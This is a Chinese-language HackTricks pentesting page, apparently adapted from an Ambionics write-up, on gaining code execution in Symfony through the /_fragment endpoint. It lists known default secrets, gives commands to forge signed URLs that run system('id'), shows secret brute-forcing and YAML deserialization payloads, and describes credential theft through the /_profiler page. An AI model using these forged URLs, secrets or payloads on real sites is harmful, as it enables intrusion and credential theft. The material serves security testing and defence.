# Symfony

<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

## 简介 <a href="#introduction" id="introduction"></a>

自2008年创建以来，[Symfony](https://symfony.com)框架在基于PHP的应用程序中的使用越来越广泛。它现在是许多知名CMS的核心组件，例如[Drupal](https://www.drupal.org)、[Joomla!](https://www.joomla.org)、[eZPlatform](https://ezplatform.com)（以前的eZPublish）或[Bolt](https://bolt.cm)，并且经常用于构建定制网站。

Symfony内置的一个特性，用于处理[ESI（边缘侧包含）](https://en.wikipedia.org/wiki/Edge\_Side\_Includes)，是[`FragmentListener`类](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php)。本质上，当有人向`/_fragment`发出请求时，此监听器会根据给定的GET参数设置请求属性。由于这允许**运行任意PHP代码**（_稍后详细说明_），请求必须使用HMAC值进行签名。这个HMAC的秘密加密密钥存储在名为`secret`的Symfony配置值下。

这个配置值`secret`，也用于构建CSRF令牌和记住我令牌。鉴于其重要性，这个值显然必须非常随机。

不幸的是，我们发现通常情况下，秘密要么有一个**默认值**，要么存在**获取该值、离线暴力破解或完全绕过与之相关的安全检查的方法**。它尤其影响Bolt、eZPlatform和eZPublish。

虽然这看起来像是一个良性配置问题，但我们发现在上述CMS以及定制应用程序中，默认值、可暴力破解或可猜测的值**非常非常常见**。这主要是因为在文档或安装指南中没有足够强调其重要性。

此外，攻击者可以通过升级影响较小的漏洞来读取`secret`（通过文件泄露）、绕过`/_fragment`签名过程（使用SSRF），甚至通过`phpinfo()`泄露它！

在这篇博客文章中，我们将描述如何在各种CMS和基础框架中获取秘密，并使用该秘密执行代码。

## 一点历史 <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

作为一个现代框架，Symfony从创建到现在一直需要处理请求的子部分的生成。在`/_fragment`之前，有`/_internal`和`/_proxy`，它们本质上做的是同样的事情。这多年来产生了很多漏洞：例如[CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes)、[CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy)和[CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access)。

自Symfony 4起，安装时会生成秘密，并默认禁用`/_fragment`页面。因此，人们会认为，拥有弱`secret`和启用`/_fragment`的情况会很少见。事实并非如此：许多框架依赖于旧的Symfony版本（甚至2.x版本仍然非常普遍），并实现了静态的`secret`值或生成它的方式很差。此外，许多框架依赖于ESI，因此启用了`/_fragment`页面。而且，正如我们将看到的，其他低影响的漏洞可以允许泄露秘密，即使它已经被安全生成。

## 在`secret`的帮助下执行代码 <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

我们将首先演示攻击者在知道`secret`配置值的情况下如何获得代码执行。这是针对最新的`symfony/http-kernel`版本，但对其他版本也类似。

### 使用`/_fragment`运行任意代码 <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

如前所述，我们将利用`/_fragment`页面。
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
public function onKernelRequest(RequestEvent $event)
{
$request = $event->getRequest();

# [1]
if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
return;
}

if ($request->attributes->has('_controller')) {
// Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
$request->query->remove('_path');

return;
}

# [2]
if ($event->isMasterRequest()) {
$this->validateRequest($request);
}

# [3]
parse_str($request->query->get('_path', ''), $attributes);
$request->attributes->add($attributes);
$request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
$request->query->remove('_path');
}
}
```
`FragmentListener:onKernelRequest` 在每个请求上运行：如果请求的路径是 `/_fragment` \[1]，该方法将首先检查请求是否有效（_即_ 是否正确签名），否则将引发异常 \[2]。如果安全检查成功，它将解析 url 编码的 `_path` 参数，并相应地设置 `$request` 属性。

请求属性不应与 HTTP 请求参数混淆：它们是 Symfony 维护的内部值，通常用户无法指定。这些请求属性之一是 `_controller`，它指定了要调用的 Symfony 控制器（一个 _(类, 方法)_ 元组，或者简单地说是一个 _函数_）。名称不以 `_` 开头的属性是将要传递给控制器的参数。例如，如果我们希望调用这个方法：
```php
class SomeClass
{
public function someMethod($firstMethodParam, $secondMethodParam)
{
...
}
}
```
我们将`_path`设置为：

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

那么请求看起来就像这样：

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

本质上，这允许调用任何函数，或任何类的任何方法，使用任何参数。鉴于Symfony拥有的类数量众多，**实现代码执行非常简单**。例如，我们可以调用`system()`：

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_调用system并不总是有效：有关利用细节，请参阅Exploit部分以获取更多信息。_

还有一个问题：Symfony是如何验证请求的签名的？

### 签名URL <a href="#signing-the-url" id="signing-the-url"></a>

为了验证URL的签名，会对_完整_的URL计算一个HMAC。然后将获得的哈希值与用户指定的哈希值进行比较。

在代码中，这是在两个地方完成的：
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// is the Request signed?
if ($this->signer->checkRequest($request)) {
return;
}

# [3]
throw new AccessDeniedHttpException();
}
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
public function checkRequest(Request $request): bool
{
$qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
}

/**
* Checks that a URI contains the correct hash.
*
* @return bool True if the URI is signed correctly, false otherwise
*/
public function check(string $uri)
{
$url = parse_url($uri);
if (isset($url['query'])) {
parse_str($url['query'], $params);
} else {
$params = [];
}

if (empty($params[$this->parameter])) {
return false;
}

$hash = $params[$this->parameter];
unset($params[$this->parameter]);

# [2]
return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
}

private function computeHash(string $uri): string
{
# [1]
return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
}

private function buildUrl(array $url, array $params = []): string
{
ksort($params, SORT_STRING);
$url['query'] = http_build_query($params, '', '&');

$scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
$host = isset($url['host']) ? $url['host'] : '';
$port = isset($url['port']) ? ':'.$url['port'] : '';
$user = isset($url['user']) ? $url['user'] : '';
$pass = isset($url['pass']) ? ':'.$url['pass'] : '';
$pass = ($user || $pass) ? "$pass@" : '';
$path = isset($url['path']) ? $url['path'] : '';
$query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
$fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
}
}
```
简而言之，Symfony 提取 `_hash` GET 参数，然后重构完整的 URL，例如 `https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`，使用 `secret` 作为密钥计算该 URL 的 HMAC \[1]，并将其与给定的哈希值进行比较 \[2]。如果不匹配，将引发 `AccessDeniedHttpException` 异常 \[3]，导致 `403` 错误。

### 示例 <a href="#example" id="example"></a>

为了测试这一点，让我们设置一个测试环境，并提取密钥（在本例中，是随机生成的）。
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
现在，访问 `http://localhost:8000/_fragment` 会出现 `403`。现在我们尝试提供一个有效的签名：
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
在访问 `http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D` 时，我们现在得到了一个 `404` 状态码。签名是正确的，但我们没有指定任何请求属性，因此Symfony找不到我们的控制器。

由于我们可以调用任何方法，使用任何参数，我们可以选择 `system($command, $return_value)`，并提供如下载荷：
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
我们现在可以访问利用URL：`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`。

尽管出现了`500`错误，我们可以看到**我们的命令被执行了**。

_使用片段进行RCE_

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## 寻找秘密 <a href="#finding-secrets" id="finding-secrets"></a>

再次强调：如果秘密无法获取，这一切都无关紧要。但往往它们是可以获取的。我们将描述几种在没有任何先验知识的情况下获取代码执行的方法。

### 通过漏洞 <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

让我们从显而易见的开始：使用低影响的漏洞来获取秘密。

#### 文件读取 <a href="#file-read" id="file-read"></a>

显然，文件读取漏洞可以用来读取以下文件，并获取`secret`：

* `app/config/parameters.yml`
* `.env`

_例如，一些Symfony调试工具栏允许你读取文件。_

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

在最近的Symfony版本（3.x）中，`secret`作为`APP_SECRET`存储在`.env`中。由于它随后被导入为一个环境变量，它们可以通过`phpinfo()`页面看到。

_通过phpinfo泄露APP_SECRET_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

这通常可以通过Symfony的分析器包完成，如截图所示。

#### SSRF / IP欺骗 (CVE-2014-5245) <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

`FragmentListener`背后的代码随着时间的推移而发展：直到版本_2.5.3_，当请求来自受信任的代理（即：`localhost`）时，它会被认为是安全的，因此不会检查哈希。例如，一个SSRF可以允许立即运行代码，无论是否拥有`secret`。这特别影响了eZPublish直到2014.7版本。
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// does the Request come from a trusted IP?
$trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
$remoteAddress = $request->server->get('REMOTE_ADDR');
if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
return;
}

// is the Request signed?
// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
return;
}

throw new AccessDeniedHttpException();
}

protected function getLocalIpAddresses()
{
return array('127.0.0.1', 'fe80::1', '::1');
}
```
诚然，所有这些技术都需要另一个漏洞。让我们深入了解一个更好的向量：默认值。

### 通过默认值 <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43: `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

在设置Symfony网站时，第一步是安装[symfony-standard](https://github.com/symfony/symfony-standard)骨架。安装后，系统会提示输入一些配置值。默认情况下，密钥是`ThisTokenIsNotSoSecretChangeIt`。

_Symfony通过composer安装_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

在后续版本（4+）中，密钥会安全生成。

#### ezPlatform 3.x（最新）: `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com)，[ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish)的继任者，仍然使用Symfony。在2019年6月10日，一个[提交](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59)将默认密钥设置为`ff6dc61a329dc96652bb092ec58981f7`。易受攻击的版本范围从3.0-alpha1到3.1.1（当前）。

尽管[文档](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters)指出应该更改密钥，但这并不是强制性的。

#### ezPlatform 2.x: `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

像Symfony的骨架一样，在安装过程中，系统会提示您输入一个密钥。默认值是`ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`。

#### Bolt CMS <= 3.7（最新）: `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm)使用了基于Symfony的已弃用微框架[Silex](https://github.com/silexphp/Silex)。它使用以下计算设置密钥：
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
因此，人们可以猜测密钥，或者利用完整路径泄露漏洞来计算它。

如果您没有使用默认密钥成功，不要失望：还有其他方法。

### 暴力破解 <a href="#bruteforce" id="bruteforce"></a>

由于密钥通常是手动设置的（而不是随机生成的），人们通常会使用口令短语而不是安全的随机值，这使得如果我们有哈希来对其进行暴力破解，它就可以被暴力破解。显然，一个有效的 `/_fragment` URL，例如由Symfony生成的，将为我们提供一个有效的消息-哈希元组来暴力破解密钥。

_有效的片段请求包含在响应中_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

在这篇博客文章的开头，我们说过Symfony的密钥有几个用途。其中一个用途是它也用于生成CSRF令牌。`secret`的另一个用途是签署记住我cookie。在某些情况下，攻击者可以使用他自己的CSRF令牌或记住我cookie来暴力破解`secret`的值。

_对这些令牌的构造进行逆向工程的工作留给读者作为练习。_

### 更进一步：eZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

作为一个例子，说明如何通过暴力破解密钥来实现代码执行，我们将看到如何找出eZPublish 2014.07的密钥。

#### 寻找暴力破解材料 <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

eZPublish这样生成它的CSRF令牌：
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
为了构建这个令牌，eZP 使用了我们已知的两个值和一个秘密：`getIntention()` 是用户尝试的操作（例如 `authenticate`），`session_id()` 是 PHP 会话 ID，而 `getSecret()`，嗯，就是 Symfony 的 `secret`。

由于 CSRF 令牌可以在一些表单上找到，我们现在有了暴力破解秘密的材料。

不幸的是，ezPublish 集成了来自 sensiolabs 的一个包，[sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle)。这个包确保秘密密钥是随机的。它在安装时这样生成它：
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
return hash('sha1', uniqid(mt_rand()));
}
```
这看起来很难进行暴力破解：`mt_rand()` 可以产生 2^31 个不同的值，而 `uniqid()` 是基于当前时间戳构建的（包括微秒）。
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### 泄露时间戳 <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

幸运的是，我们知道这个秘密是在安装的最后一步生成的，就在网站设置完成之后。这意味着我们可能可以泄露用于生成这个哈希的时间戳。

一种方法是使用日志（例如 `/var/log/storage.log`）；可以泄露第一次创建缓存条目的时间。缓存条目是在调用 `generateRandomSecret()` 之后立即创建的。

_示例日志内容：时间戳与用于计算秘密的时间戳类似_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

如果没有日志可用，可以使用 eZPublish 的非常强大的搜索引擎来找到网站最初元素的创建时间。实际上，当网站创建时，数据库中会插入许多时间戳。这意味着 eZPublish 网站初始数据的时间戳与用于计算 `uniqid()` 的时间戳相同。我们可以查找 `landing_page` _ContentObject_ 并找出其时间戳。

## 暴力破解缺失的位 <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

我们现在知道了用于计算秘密的时间戳，以及以下形式的哈希：
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
这使我们总共有 231 \* 106 种可能性。使用 [hashcat](https://hashcat.net) 和一组好的 GPU，这似乎是可行的，但 hashcat 并没有提供 `sha1(sha1($pass).$salt)` 内核。幸运的是，我们实现了它！您可以在[这里找到拉取请求](https://github.com/hashcat/hashcat/pull/2536)。

使用我们拥有 8 个 GPU 的破解机器，我们可以在 _20 小时内_ 破解这个哈希。

获取哈希后，我们可以使用 `/_fragment` 来执行代码。

## 结论 <a href="#conclusion" id="conclusion"></a>

Symfony 现在是许多 PHP 应用程序的核心组件。因此，任何影响框架的安全风险都会影响大量网站。正如本文所示，无论是弱秘密还是影响较小的漏洞，都允许攻击者获得**远程代码执行**。

作为一个蓝队成员，你应该查看你所有依赖 Symfony 的网站。即使是最新的软件也不能排除漏洞，因为秘密密钥是在产品首次安装时生成的。因此，如果你几年前创建了一个基于 Symfony-3.x 的网站，并一直保持更新，那么很可能秘密密钥仍然是默认的。

## 利用 <a href="#exploitation" id="exploitation"></a>

### 理论 <a href="#theory" id="theory"></a>

首先，在利用这个漏洞时，我们有几件事需要担心：

* HMAC 使用**完整的 URL**计算。如果网站位于反向代理之后，我们需要使用服务的内部 URL 而不是我们发送有效载荷的 URL。例如，内部 URL 可能是 HTTP 而不是 HTTPS。
* HMAC 的算法多年来发生了变化：之前是 **SHA-1**，现在是 **SHA-256**。
* 由于 Symfony 从请求中删除了 `_hash` 参数，然后再次生成 URL，我们需要在它所做的相同 URL 上计算哈希。
* 可以使用许多秘密，所以我们需要检查它们所有。
* 在某些 PHP 版本上，我们不能调用具有“按引用”参数的函数，例如 `system($command, &$return_value)`。
* 在某些 Symfony 版本上，`_controller` 不能是一个函数，它必须是一个方法。我们需要找到一个允许我们执行代码的 Symfony 方法。

另一方面，我们可以利用一些事情：

* 使用无参数或无效哈希访问 `/_fragment` 应返回 `403`。
* 使用有效哈希但没有有效控制器访问 `/_fragment` 应产生 `500`。

最后一点允许我们在不担心之后要调用哪个函数或方法的情况下测试秘密值。

### 实践 <a href="#practice" id="practice"></a>

假设我们正在攻击 `https://target.com/_fragment`。为了能够正确签名一个 URL，我们需要知道：

* 内部 URL：它可能是 `https://target.com/_fragment`，或者可能是 `http://target.com/_fragment`，或者可能是完全不同的东西（例如 `http://target.website.internal`），我们无法猜测
* 秘密密钥：我们有一个常用秘密密钥列表，例如 `ThisTokenIsNotSoSecretChangeIt`，`ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` 等。
* 算法：SHA1 或 SHA256

我们还不需要担心有效载荷（`_path` 的内容），因为正确签名的 URL 不会导致抛出 `AccessDeniedHttpException`，因此不会导致 `403`。因此，漏洞利用将尝试每个（算法，URL，秘密）组合，生成一个 URL，并检查它是否不产生 `403` 状态码。

_没有 `_path` 参数向 `/_fragment` 发出的有效请求_

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

此时，我们可以签名任何 `/_fragment` URL，这意味着它是一个保证的 RCE。只是一个关于要调用什么的问题。

然后，我们需要找出我们是否可以直接调用函数，或者我们需要使用类方法。我们可以首先尝试最直接的方法，使用像 `phpinfo ([ int $what = INFO_ALL ] )` 这样的函数（[文档](https://www.php.net/manual/en/function.phpinfo.php)）。`_path` GET 参数看起来会是这样：
```
_controller=phpinfo
&what=-1
```
URL将如下所示：

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

如果HTTP响应显示了一个`phpinfo()`页面，我们就成功了。然后我们可以尝试使用另一个函数，比如`assert`：

_使用`_controller=assert`的示例输出_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

否则，这意味着我们需要使用类方法。一个好的候选是`Symfony\Component\Yaml\Inline::parse`，这是一个内置的Symfony类，因此它存在于Symfony网站上。

显然，这个方法解析一个YAML输入字符串。Symfony的[YAML](https://yaml.org)解析器支持`php/object`标签，它会使用`unserialize()`将序列化的输入字符串转换成对象。这让我们可以使用我们最喜欢的PHP工具，[PHPGGC](https://github.com/ambionics/phpggc)！

这个方法的原型随着时间的推移而改变。例如，这里有三个不同的原型：
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
```markdown
而不是为这些每一个构建 `_path`，我们可以利用这样一个事实：如果我们提供一个与方法原型不匹配的参数名称，它将被忽略。因此，我们可以向方法中添加每一个可能的参数，而不用担心实际的原型。

因此，我们可以这样构建 `_path`：
```
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
我们可以尝试使用`phpinfo()`，看看是否有效。如果有效，我们可以改用`system()`。

_使用`Inline::parse`和序列化有效载荷的示例输出_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

因此，漏洞利用将遍历每一种可能的变量组合，然后尝试两种利用方法。代码可在[我们的GitHub](https://github.com/ambionics/symfony-exploits)上获取。

## 访问symfony /\_profiler信息

![f:id:flattsecurity:20201021204553p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204553.png)

如上图所示，页面右下角有一个`sf`标志。当Symfony处于调试模式时会显示这个标志。有些情况下这个标志可能不会显示，所以尝试访问`/_profiler`，你将看到下面显示的页面

![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

这个功能称为Symfony Profiler，互联网上关于这个功能的信息不多。这个功能的目的非常明确；它在出现错误或bug时帮助你调试。当然，这个功能只能在启用调试模式时使用。

Symfony框架本身非常安全，但启用调试模式会使这个框架变得极其脆弱。例如，Profiler有一个叫做Profile Search的功能，如下图所示。

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

如上图所示，你可以访问发送到服务器的所有请求。通过点击令牌中的哈希值，你会看到所有POST参数都可以被读取，如下图所示。利用这个功能，我们可以劫持管理员和用户的账户凭证。

![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### 其他启用调试的端点

你还应该检查这些URL：

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## 参考资料

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks**上看到你的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享你的黑客技巧**。

</details>
